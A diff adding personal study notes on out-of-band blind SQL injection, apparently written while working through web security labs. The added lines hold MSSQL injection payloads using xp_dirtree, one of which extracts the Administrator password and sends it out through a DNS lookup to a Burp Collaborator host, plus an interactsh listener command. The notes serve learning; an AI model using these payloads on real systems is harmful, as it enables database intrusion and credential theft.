@@ -591,7 +591,26 @@ this will pause the database for  10 seconds (solution) why we used pg_sleep(10)
 if  you hacked another thing -> you   just see how to sleep it with different database commands untill you see the output is paused.
  
  
- 
+ Exploiting blind SQL injection using out-of-band (OAST) techniques
+	- app in this type -> do sql query asynchronously
+	- traking cookie is still vulnerable
+	- none of (error sql or delay sql,..) will work.
+
+	- exploit db by using;
+		- triggering out of band 
+		- DNS protocol 
+		- the easiest way for out of band is collabrotor.
+		-to trigger the DNS use this query;
+			-'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+			
+use this to exfiltate data from vulnerable app;
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+out of band the most effective way to find a vulnerability through the db.
+
+	untill now ; we need to download other band(to get the output of the database we need to vulnerable this band is done using DNS server)
+	~/go/bin/interactsh-client -v -o interactsh-log.txt  tomorrow you need to start with this command + start OAST sql injection lab inshallah
+
+	
  
  
  
